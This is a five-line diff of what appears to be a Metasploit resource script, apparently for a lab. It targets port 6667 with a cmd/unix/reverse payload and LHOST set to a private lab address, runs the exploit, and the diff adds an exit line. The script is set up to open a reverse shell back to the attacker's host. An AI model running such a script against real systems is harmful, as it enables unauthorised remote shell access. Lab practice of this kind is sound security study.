@@ -4,3 +4,4 @@ set RPORT 6667
 set PAYLOAD cmd/unix/reverse
 set LHOST 192.168.56.101
 exploit -z
+exit
